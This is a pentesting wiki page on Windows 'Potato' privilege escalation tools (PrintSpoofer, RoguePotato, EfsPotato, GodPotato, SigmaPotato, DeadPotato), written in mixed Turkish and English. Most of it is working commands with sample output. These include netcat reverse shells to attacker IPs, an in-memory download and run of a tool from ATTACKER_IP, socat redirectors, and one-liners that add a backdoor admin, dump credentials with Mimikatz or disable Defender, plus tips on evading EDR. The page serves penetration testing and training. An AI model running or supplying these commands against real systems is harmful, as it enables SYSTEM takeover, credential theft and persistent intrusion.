# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **aynı ayrıcalıkları kullanmak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim elde etmek.** Bu [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) derinlemesine bilgi veriyor; `PrintSpoofer` aracı, JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 hostlarında impersonation ayrıcalıklarını kötüye kullanmak için kullanılabilir.

> [!TIP]
> 2024–2025 yıllarında sıkça güncellenen modern bir alternatif SigmaPotato (a fork of GodPotato) olup, in-memory/.NET reflection kullanımını ve genişletilmiş OS desteğini ekler. Aşağıda hızlı kullanım örneğine ve Referanslar bölümündeki repoya bakın.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve yaygın tuzaklar

Aşağıdaki tüm teknikler, aşağıdaki ayrıcalıklardan birine sahip bir bağlamdan impersonation-capable privileged service'ı kötüye kullanmaya dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- High integrity gerekmez eğer token zaten SeImpersonatePrivilege'e sahipse (IIS AppPool, MSSQL gibi birçok servis hesabı için tipiktir, vb.)

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyonel notlar:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- Mevcut konsolda etkileşimli bir süreç başlatmak için -i'yi veya bir one-liner çalıştırmak için -c'yi kullanabilirsiniz.
- Spooler service gerektirir. Devre dışıysa bu başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engelliyse, OXID resolver'ı socat ile redirector'ınızda pivot edin:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato, 2022 sonunda yayımlanan daha yeni bir COM abuse primitive'dir ve Spooler/BITS yerine **PrintNotify** servisini hedef alır. İkili, PrintNotify COM sunucusunu başlatır, sahte bir `IUnknown` takar ve sonra `CreatePointerMoniker` aracılığıyla ayrıcalıklı bir geri çağırmayı tetikler. PrintNotify servisi (çalışırken **SYSTEM**) geri bağlandığında, süreç döndürülen token'ı kopyalar ve verilen payload'u tam ayrıcalıklarla başlatır.

Key operational notes:

* Windows 10/11 ve Windows Server 2012–2022'de, Print Workflow/PrintNotify servisi yüklü olduğu sürece çalışır (eski Spooler post-PrintNightmare devre dışı olsa bile mevcut olur).
* Çağıran bağlamın **SeImpersonatePrivilege** yetkisine sahip olmasını gerektirir (IIS APPPOOL, MSSQL ve zamanlanmış görev servis hesapları için tipiktir).
* Doğrudan bir komut veya etkileşimli bir modu kabul eder, böylece orijinal konsolda kalabilirsiniz. Örnek:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Tamamen COM tabanlı olduğu için named-pipe dinleyicilerine veya dış yönlendiricilere ihtiyaç yoktur; bu da Defender'ın RoguePotato’nin RPC binding'ini engellediği hostlarda drop-in bir replacement yapar.

Ink Dragon gibi operatörler, SharePoint üzerinde ViewState RCE elde ettikten hemen sonra PrintNotifyPotato'yu tetiklerler; böylece `w3wp.exe` worker'dan SYSTEM'a geçiş yapıp ShadowPad'i kurmadan önce ayrıcalıkları yükseltirler.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Eğer bir pipe başarısız olursa veya EDR bunu engellerse, desteklenen diğer pipes'leri deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- Windows 8/8.1–11 ve Server 2012–2022'de SeImpersonatePrivilege mevcut olduğunda çalışır.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE olan servis DCOM nesnelerini hedefleyen iki varyant sağlar. Sağlanan ikili dosyaları derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork)

SigmaPotato, .NET reflection aracılığıyla bellek içi yürütme ve bir PowerShell reverse shell helper gibi modern özellikler ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Dahili reverse shell bayrağı `--revshell` ve 1024 karakterlik PowerShell sınırının kaldırılması, böylece uzun AMSI-bypassing payloads'ı tek seferde çalıştırabilirsiniz.
- Reflection-dostu sözdizimi (`[SigmaPotato]::Main()`), ayrıca basit heuristikleri yanıltmak için `VirtualAllocExNuma()` ile ilkel bir AV evasion numarası.
- PowerShell Core ortamları için .NET 2.0 hedef alınarak derlenmiş ayrı `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato, GodPotato OXID/DCOM impersonation chain'ini korur ancak post-exploitation yardımcılarını entegre ederek operatörlerin hemen SYSTEM'i ele geçirip ek araçlara gerek kalmadan persistence/collection gerçekleştirmesini sağlar.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM olarak rastgele komut çalıştırır.
- `-rev <ip:port>` — hızlı reverse shell.
- `-newadmin user:pass` — persistence için yerel bir admin oluşturur.
- `-mimi sam|lsa|all` — Mimikatz'i bırakıp çalıştırarak kimlik bilgilerini döker (diske yazar, gürültülü).
- `-sharphound` — SharpHound collection'ını SYSTEM olarak çalıştırır.
- `-defender off` — Defender gerçek zamanlı korumasını kapatır (çok gürültülü).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ek ikili dosyalar içerdiğinden, daha fazla AV/EDR tespiti bekleyin; gizlenmenin önemli olduğu durumlarda daha hafif GodPotato/SigmaPotato kullanın.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
